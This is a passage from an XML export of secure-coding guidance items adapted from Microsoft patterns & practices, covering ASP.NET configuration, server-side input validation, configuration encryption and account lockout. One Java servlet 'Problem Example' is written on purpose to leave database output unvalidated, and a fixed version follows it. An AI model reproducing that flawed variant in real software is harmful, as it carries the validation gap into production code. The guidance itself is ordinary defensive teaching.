&lt;p&gt;Additionally, the following configuration ensures that unauthenticated users are allowed to access pages in the application's root directory. Place this configuration in the main &amp;lt;&lt;strong&gt;system.web&lt;/strong&gt;&amp;gt; element.
&lt;/p&gt;
&lt;pre&gt;&amp;lt;system.web&amp;gt;&lt;br&gt;  &amp;lt;!-- The virtual directory root folder contains general pages.&lt;br&gt;       Unauthenticated users can view them and they do not need&lt;br&gt;        to be secured with SSL. --&amp;gt;&lt;br&gt;  &amp;lt;authorization&amp;gt;&lt;br&gt;    &amp;lt;allow users=&amp;quot;*&amp;quot; /&amp;gt;&lt;br&gt;  &amp;lt;/authorization&amp;gt;&lt;br&gt;&amp;lt;/system.web&amp;gt;  &lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;If you use this type of site structure, your application must not rely on the user's identity on the non-SSL pages. In the preceding configuration, no forms authentication ticket is sent for requests for non-SSL pages. As a result,
 the user is considered anonymous. This has implications for related features, such as personalization, that require the user name.&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>ae57fb40-a7ab-428e-9ed1-6624d4ae8181</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Validate Input from All Sources</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Input and Data Validation</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Applications written using Servlets or JSP.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Treat input from all external sources as untrusted and apply input validation techniques.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Input that is not validated can lead to cross-site scripting, SQL injection, directory traversals, and other vulnerabilities&amp;nbsp;that could allow an attacker to gain unauthorized access to sensitive data.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Treat all input as untrusted. If you have established trust boundaries for your application, then validate data every time it crosses a trust boundary.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;An application can take input via various ways: web interface, database, file system, other software running on the server, etc. Use the following steps to establish a validation strategy:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Establish your application's trust boundary:&lt;/strong&gt; The notion is that all input not generated by your application is untrusted.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify all sources of input&lt;/strong&gt;: An application can have various sources of input and each one is an entry point to your application&amp;nbsp;that can potentially be used to break your application's security model. Enumerate all possible sources of
 input and make note of the expected input&amp;nbsp;at&amp;nbsp;each source. Potential sources of input in a web application typically include:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;URL based parameters &lt;/li&gt;&lt;li&gt;Form based parameters &lt;/li&gt;&lt;li&gt;Hidden fields &lt;/li&gt;&lt;li&gt;Cookies &lt;/li&gt;&lt;li&gt;HTTP headers &lt;/li&gt;&lt;li&gt;Local filesystem &lt;/li&gt;&lt;li&gt;Database &lt;/li&gt;&lt;li&gt;Other related services&lt;/li&gt;&lt;/ol&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Understand the input that your application can handle and process&lt;/strong&gt;: After identifying the different entry points, define the format and type of input that&amp;nbsp;should be provided through each entry point.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Create a set of validators&lt;/strong&gt;: Build a validator for each format and type of expected input. Centralize your application's validators as it helps strengthen the code by limiting the amount of scattered validation code throughout your application.
 Place the set of validators on your application's trust boundary. Your application should accept input from the outside world only through its set of validators.
&lt;/p&gt;
&lt;p&gt;See the &lt;a href="?#ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559"&gt;Validate Input for Length, Range, Format, and Type&lt;/a&gt; guideline for more information on constructing validation routines.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code produces a data analysis based on a financial index. Unfortunately, the application validates the user's input but not the returned data from the database. Therefore, the application is vulnerable to an integer overflow that can harm the
 business logic used in generating the data analysis.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;import java.io.*;&lt;br&gt;import java.util.*;&lt;br&gt;import java.lang.*;&lt;br&gt;import javax.servlet.*;&lt;br&gt;import javax.servlet.http.*;&lt;br&gt;import java.util.regex.*;&lt;br&gt; public final class DataAggregator extends HttpServlet&lt;br&gt;{      public void doGet(HttpServletRequest request, HttpServletResponse response)&lt;br&gt;            throws ServletException, IOException&lt;br&gt;      {            PrintWriter out = response.getWriter();&lt;br&gt;            String searchTerm = request.getParameter(&amp;quot;index&amp;quot;);&lt;br&gt;             try&lt;br&gt;            {&lt;br&gt;                  // The application validates the user-supplied input&lt;br&gt;                  if (validateSearchTerm(searchTerm))&lt;br&gt;                  {&lt;br&gt;                        String retString;&lt;br&gt;                         retString = &amp;quot;The queried index \&amp;quot;&amp;quot;;&lt;br&gt;                        retString &amp;#43;= encodeHtml(searchTerm);&lt;br&gt;                        retString &amp;#43;= &amp;quot;\&amp;quot; produced the following results:&amp;lt;br&amp;gt; &amp;quot;;&lt;br&gt;                        out.println(retString);&lt;br&gt;                        aggregateData(out, searchTerm);&lt;br&gt;                  }&lt;br&gt;                  else&lt;br&gt;                  {&lt;br&gt;                        // Add the appropriate logging and exception handling&lt;br&gt;                        // mechanisms. Consult the Exception Handling and&lt;br&gt;                         // Logging sections&lt;br&gt;                         out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                                 &amp;#43; &amp;quot; Please try again later.&amp;quot;);&lt;br&gt;                  }&lt;br&gt;            }&lt;br&gt;             catch (Exception e)&lt;br&gt;            {&lt;br&gt;                  // Add the appropriate logging and exception handling&lt;br&gt;                   // mechanisms. Consult the Exception Handling and&lt;br&gt;                   // Logging sections &lt;br&gt;                  out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                           &amp;#43; &amp;quot; Please try again later.&amp;quot;);&lt;br&gt;            }&lt;br&gt;             out.flush();&lt;br&gt;            out.close();&lt;br&gt;      }&lt;br&gt;       boolean validateSearchTerm(String input)&lt;br&gt;      {&lt;br&gt;            String goodPattern = &amp;quot;(\\w|\\d)&amp;#43;&amp;quot;;&lt;br&gt;            int goodLength = 8;&lt;br&gt;             if (input == null)&lt;br&gt;            {&lt;br&gt;                  return false;&lt;br&gt;            }&lt;br&gt;             if(input.length() &amp;gt; goodLength)&lt;br&gt;            {&lt;br&gt;                  return false;&lt;br&gt;            }&lt;br&gt;                        Pattern p = Pattern.compile(goodPattern);&lt;br&gt;            Matcher m = p.matcher(input);&lt;br&gt;                        if(!m.matches())&lt;br&gt;            {&lt;br&gt;                  return false;&lt;br&gt;            }&lt;br&gt;                        return true;&lt;br&gt;      }&lt;br&gt;       void aggregateData(PrintWriter out, String searchTerm)&lt;br&gt;      {&lt;br&gt;            double[] rData = common.queryDBForIndex(searchTerm);&lt;br&gt;             // The application fails to validate the returned&lt;br&gt;             // data from the database&lt;br&gt;             // Business logic that performs certain data analysis&lt;br&gt;      }&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following code produces a data analysis based on a financial index. Since the code validates all sources of input to the application, the application is secured from SQL injection and integer overflows. Notice that this example code is also related to
&lt;a href="?#ruledisplay:c98695c5-cf02-44a1-96bf-1f8046b8ad9d"&gt;Validate Input for Length, Range, Format, and Type&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;import java.io.*;&lt;br&gt;import java.util.*;&lt;br&gt;import java.lang.*;&lt;br&gt;import javax.servlet.*;&lt;br&gt;import javax.servlet.http.*;&lt;br&gt;import java.util.regex.*;&lt;br&gt; public final class DataAggregator extends HttpServlet&lt;br&gt;{      public void doGet(HttpServletRequest request, HttpServletResponse response)&lt;br&gt;            throws ServletException, IOException&lt;br&gt;      {&lt;br&gt;            PrintWriter out = response.getWriter();&lt;br&gt;            String searchTerm = request.getParameter(&amp;quot;index&amp;quot;);&lt;br&gt;             try&lt;br&gt;            {&lt;br&gt;                  // The application validates the user-supplied input&lt;br&gt;                  if (validateSearchTerm(searchTerm))&lt;br&gt;                  {&lt;br&gt;                        String retString;&lt;br&gt;                         retString = &amp;quot;The queried index \&amp;quot;&amp;quot;;&lt;br&gt;                        retString &amp;#43;= encodeHtml(searchTerm);&lt;br&gt;                        retString &amp;#43;= &amp;quot;\&amp;quot; produced the following results:&amp;lt;br&amp;gt; &amp;quot;;&lt;br&gt;                        out.println(retString);&lt;br&gt;                        aggregateData(out, searchTerm);&lt;br&gt;                  }&lt;br&gt;                  else&lt;br&gt;                  {&lt;br&gt;                        // Add the appropriate logging and exception&lt;br&gt;                        // handling mechanisms. Consult the Exception Handling&lt;br&gt;                        // and Logging sections &lt;br&gt;                        out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                                 &amp;#43; &amp;quot; Please try again later.&amp;quot;);&lt;br&gt;                  }&lt;br&gt;            }&lt;br&gt;             catch (Exception e)&lt;br&gt;            {&lt;br&gt;                  // Add the appropriate logging and exception handling mechanisms&lt;br&gt;                  // Consult the Exception Handling and Logging sections&lt;br&gt;                   out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                           &amp;#43; &amp;quot; Please try again later.&amp;quot;);&lt;br&gt;            }&lt;br&gt;             out.flush();&lt;br&gt;            out.close();&lt;br&gt;      }&lt;br&gt;       void aggregateData(PrintWriter out, String searchTerm) throws Exception&lt;br&gt;      {&lt;br&gt;            double[] rData = common.queryDBForIndex(searchTerm);&lt;br&gt;             // The application validates the returned data from the database&lt;br&gt;            if (validateRawDBData(rData))&lt;br&gt;            {&lt;br&gt;                  // Business logic that performs certain data analysis&lt;br&gt;            }&lt;br&gt;            else&lt;br&gt;            {&lt;br&gt;                  String errMsg = &amp;quot;Business logic not executed&amp;quot;;&lt;br&gt;                  throw new Exception(errMsg);&lt;br&gt;            }&lt;br&gt;      }&lt;br&gt;       boolean validateSearchTerm(String input)&lt;br&gt;      {&lt;br&gt;            String goodPattern = &amp;quot;(\\w|\\d)&amp;#43;&amp;quot;;&lt;br&gt;            int goodLength = 8;&lt;br&gt;             if (input == null)&lt;br&gt;            {&lt;br&gt;                  return false;&lt;br&gt;            }&lt;br&gt;             if(input.length() &amp;gt; goodLength)&lt;br&gt;            {&lt;br&gt;                  return false;&lt;br&gt;            }&lt;br&gt;                        Pattern p = Pattern.compile(goodPattern);&lt;br&gt;            Matcher m = p.matcher(input);&lt;br&gt;                        if(!m.matches())&lt;br&gt;            {&lt;br&gt;                  return false;&lt;br&gt;            }&lt;br&gt;                        return true;&lt;br&gt;      }&lt;br&gt;       boolean validateRawDBData(double[] input)&lt;br&gt;      {&lt;br&gt;            boolean valid = true;&lt;br&gt;             for (int i = 0; i &amp;lt; input.length; i&amp;#43;&amp;#43;)&lt;br&gt;            {&lt;br&gt;                  if (input[i] &amp;lt; 0.0 || input[i] &amp;gt; 100.0)&lt;br&gt;                  {&lt;br&gt;                        valid = false;&lt;br&gt;                  }&lt;br&gt;            }&lt;br&gt;             return valid;&lt;br&gt;      }&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559"&gt;Guideline: Validate Input for Length, Range, Format, and Type (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:BEC58471-A0EF-40C5-8C9D-9BF5C4B91F1F"&gt;Guideline: Filter All User-Supplied Filename and Path Input (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:2D8158D1-E2D1-459F-9BD7-56D4B979EFE3"&gt;Guideline: Encode All Output Data (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:D6593992-DC9E-42C5-9E98-30E8EF075B93"&gt;Guideline: Do Not Rely on Client-Side Validation (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:81491E66-67B7-49F3-BDA6-4B4C9245C702"&gt;Guideline: Validate All Input Passed to Database (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:D8D7FC19-F935-4FA1-BB66-8D4B8A185CDB"&gt;Guideline: Validate User's Login Credentials Before Processing Them (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:42F599F0-D1D6-4F25-9CC2-D5473F19113F"&gt;Guideline: Validate All Data Passed Between Native and Java Code (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:178EB28D-4F49-4476-AE8A-437F966DE577"&gt;Checklist Item: Input from All Sources is Validated (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>b797adfa-93bf-4f6e-9b30-70a0758ecd3d</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Do Not Rely on Client-Side Validation</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Client-side validation can reduce the number of round trips to the server, but do not rely on it for security because it is easy to bypass. Validate all input at the server.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;It is easy to modify the behavior of the client or just write a new client that does not observe the same data validation rules.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;All applications should only use Server-side validation when the code relys on security.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Server-side code should perform its own validation. What if an attacker bypasses your client, or shuts off your client-side script routines, for example, by disabling JavaScript? Use client-side validation to help reduce the number of round trips to the
 server but do not rely on it for security. This is an example of defense in depth.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information see, &amp;quot;Chapter 4 - Design Guidelines for Secure Web Applications&amp;quot; at
&lt;a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx"&gt;http://msdn2.microsoft.com/en-us/library/aa302420.aspx&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>bae35023-258d-40f5-8c36-22f562c83c36</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Encrypt Configuration Sections that Store Sensitive Data</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Deployment Considerations</category>
    <phase>Deployment</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Encrypt configuration sections containing sensitive data such as passwords or usernames.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Configuration sections typically contain privacy sensitive resource access credentials (e.g., a connection string for a SQL server resource includes a username and password.) As a precautionary measure, they should not be stored in plaintext, because an
 attacker that can compromise a server will be able to read those values if they are not adequately protected.
&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;This guideline is applicable whenever configuration sections are utilized. &lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;In ASP.NET, you can use either the DPAPI or RSA protected configuration providers to encrypt specific sections that contain sensitive data. The sections that usually contain sensitive information that you need to encrypt include &amp;lt;appSettings&amp;gt;, &amp;lt;connectionStrings&amp;gt;,
 &amp;lt;identity&amp;gt;, and &amp;lt;sessionState&amp;gt;. To encrypt the &amp;lt;connectionStrings&amp;gt; section by using the DPAPI provider with the machine-key store (the default configuration), run the following command from a command window:&lt;/p&gt;
&lt;div&gt;&lt;br&gt;
&lt;pre&gt;aspnet_regiis -pe &amp;quot;connectionStrings&amp;quot; -app &amp;quot;/MachineDPAPI&amp;quot; -prov &amp;quot;DataProtectionConfigurationProvider&amp;quot; &lt;/pre&gt;
&lt;br&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;-pe&lt;/strong&gt;: Specifies the configuration section to encrypt. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;-app&lt;/strong&gt;: Specifies your Web application's virtual path. If your application is nested, you need to specify the nested path from the root directory; for example, &amp;quot;/test/aspnet/MachineDPAPI&amp;quot;.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;-prov&lt;/strong&gt;: Specifies the provider name.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;If you need to encrypt configuration file data on multiple servers in a Web farm, you should use RSA protected configuration provider because of the ease with which you can export RSA key containers.&amp;nbsp;
&lt;/p&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:f10679b7-5390-49ee-b529-7a2f7c059ce7"&gt;Encrypt Connection Strings&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:760734bc-7080-4864-91ec-fd6db510f8ed"&gt;Credentials in SQL Connection Strings are Protected in Configuration Files&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>c2651adf-f0d8-4067-b3fc-0c8b0cb315f4</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Validate Input from All Sources For Type, Length, Format, and Range</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Do not trust input.&amp;nbsp; Instead, validate on the server that it matches the expected input, be careful which contexts you allow it to be used in, and encode it appropriately on output.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;An attacker passing malicious input can attempt SQL injection, cross-site scripting, and other injection attacks that aim to exploit your application's vulnerabilities.&amp;nbsp; Validating input helps to reduce these risks by ensuring that the input received matches
 the expected format.&amp;nbsp;Input validation on it's own is not sufficient; output encoding is also needed to fully prevent these attacks, but it is an important step for both security and reliability.
&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;All input should always be validated, regardless of source.&amp;nbsp; Unless data is actually static within the scope of the local code base, it could be modified by a malicious user—even data in a database which is supposed to be static.&amp;nbsp;
&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Where to Validate Data.&lt;/strong&gt; Input must be validated on the server for security checks.&amp;nbsp; While it can be useful for user experience reasons to check the input on the client side, especially on things like web applications with high round-trip
 latencies, this client-side validation is not sufficient to provide security guarantees, as it can be circumvented by the attacker.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;What Data to Validate.&lt;/strong&gt; Check for known good data and constrain input by validating it for type, length, format, and range.&amp;nbsp; For Web form applications that obtain input through server controls, use the ASP.NET validator controls, such as
 the RegularExpressionValidator, RangeValidator, and CustomValidator, to validate and constrain input.&amp;nbsp; All input not under control of the system should be validated, but input coming directly from users must be validated and should receive the most attention.&amp;nbsp;
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;How to Implement Validation.&lt;/strong&gt; Most Web applications accept input from various sources, including HTML controls, server controls, query strings, and cookies.&amp;nbsp; Validate input from all of these sources to help prevent injection attacks.&amp;nbsp; Use
 regular expressions to help validate input.&amp;nbsp; The following example shows how to use the Regex class.
&lt;/p&gt;
&lt;pre&gt;using System.Text.RegularExpressions;&lt;br&gt;// Instance method:Regex reg = new Regex(@&amp;quot;^[a-zA-Z'.\s]{1,40}$&amp;quot;);&lt;br&gt;Response.Write(reg.IsMatch(Request.QueryString[&amp;quot;Name&amp;quot;]));&lt;br&gt;// Static method:&lt;br&gt;if (!Regex.IsMatch(Request.QueryString[&amp;quot;Name&amp;quot;],@&amp;quot;^[a-zA-Z'.\s]{1,40}$&amp;quot;))&lt;br&gt;{&lt;br&gt;   // Name does not match expression&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;If you cannot cache your regular expression for frequent use, you should use the static IsMatch method where possible for performance reasons, to avoid unnecessary object creation.
&lt;/p&gt;
&lt;p&gt;In general, validate your input against the least permissive expression possible that will accept all the input you expect for that field.&amp;nbsp; If you know that the field will have certain internal structure, check for it.&amp;nbsp; If there is a range of standard formats
 which your users may enter data in, but these formats are easily converted to a single internal format, do so.&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Validating input does not remove the need to format output, parametrize queries, or otherwise handle user input carefully.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Validating Specific Data Types.&lt;/strong&gt; Specific data types allow for and require different types of checks.&amp;nbsp; Here are some guidelines for common data types:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Numeric Data.&lt;/strong&gt; Check all numeric fields for type and range. If you are not using server controls, you can use regular expressions and the Regex class, and you can validate numeric ranges by converting the input value to an integer or double,
 ensuring the conversion was valid,&amp;nbsp;and then performing a range check.&amp;nbsp; If your input has an internal checksum, like a credit card number, check that too.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Address Data.&lt;/strong&gt; Address data has a fairly rich internal structure; the more of this structure your validation routine understands, the better you'll be able to validate the information.&amp;nbsp; Phone numbers can be validated as a string of ten digits,
 or a variable number of digits beginning with the character '&amp;#43;' if international numbers are allowed.&amp;nbsp; If needed, the country code can be determined and the exact number format looked up.&amp;nbsp; While phone numbers are written several different ways,&amp;nbsp;a canonical
 representation can be created by stripping all non-numeric characters before validation, something which will save your users time and frustration as they enter data into your site.&amp;nbsp; Street addresses require a little bit more care; if the input is taken in
 divided into street, city, etc., each field can have a seperate safe character set defined--city names don't need numbers, for instance.&amp;nbsp; Names are fairly straightforward, but are one of the cases where the &amp;quot;'&amp;quot; character is valid input, and thus they must
 be handled appropriately (as all input should be) at the database level.&amp;nbsp; Also, don't forget to allow accented characters in names and addresses, depending on your current code page.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Reference Data. &lt;/strong&gt;Data that refers to other things can go through one final step of validation, namely looking up what it refers to to insure that the reference is valid.&amp;nbsp; For instance, postal codes can be validated against a canonical list
 to ensure correctness, and other aspects of the street address cross-checked with that.&amp;nbsp; In an order management system, item IDs can be&amp;nbsp;checked against a list of valid IDs.&lt;/p&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;An order form for a web store has several fields, specifically, a name, address, phone number, item number, and quantity.&amp;nbsp; Each item is simply added to the database with no data validation and all typecasting handled by the database.&amp;nbsp; Typecasting in the
 database does not prevent SQL injection and has little effect on out of range data.&amp;nbsp; An attacker can perform numerous attacks, from something as benign as filling the database with garbage data to more actively destructive SQL injection and cross-site scripting
 attacks.&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;An ASP.NET application contains an order for for a web store.&amp;nbsp; Each of the forms fields are validated, giving stronger guarantees about the data gathered.&amp;nbsp; The phone number&amp;nbsp;is validated as a string of ten digits (after stripping all non-numeric characters),
 or a variable number of digits beginning with the character '&amp;#43;' if international numbers are allowed.&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;Validating a name, address, and item number can all be a bit more complicated.&amp;nbsp; The first order of business is determining the legal character set for each case.&amp;nbsp; For names, spaces, upper and lower case letters (including the accented forms for your current
 codepage), and possible numbrs and periods are enough.&amp;nbsp; Addresses need to add commas, hyphens, and number signs, at a minimum.&amp;nbsp; Validating item numbers may be as simple as casting to an integer and checking that the result is in the right range, or it may
 mean a more complicated regular expression that checks for internal formatting in a string.
&lt;/p&gt;
&lt;p&gt;The last, optional step of data validation is to ensure that the data refers to a valid things.&amp;nbsp; The data should be validated for format first, especially as further checks may require database queries.&amp;nbsp; Item numbers are an obvious thing to check for existence
 in the DB, and this would normally happen as part of the stored procedure which creates a new order, but names, addresses, and phone numbers can be similarly checked, some times.&amp;nbsp; For example, if the address field is broken up into components, state or province
 information, zip/post codes, and city names, at a minimum, can all be validated against existing lists.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>c368e75b-2f2b-4e2f-8014-693826aadb64</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Support Account Management</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Authentication</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Web Application&amp;nbsp;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Ensure that the code enforce password complexity rules and restricts the number of failed logon attempts.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Restricting the number of failed login attempts helps to counter the threat of dictionary attacks.
&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;The use of strong passwords, restricted login attempts, and other best practice account management policies can be enforced by Windows security policy if your application uses Windows authentication. Otherwise, the application layer is responsible for this.
&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;h2&gt;Use Account Lockout Policies for End-User Accounts&lt;/h2&gt;
&lt;p&gt;Disable end-user accounts or write events to a log after a set number of failed logon attempts. If you are using Windows authentication, such as NTLM or the Kerberos protocol, these policies can be configured and applied automatically by the operating system.
 With Forms authentication, these policies are the responsibility of the application and must be incorporated into the application design.&lt;/p&gt;
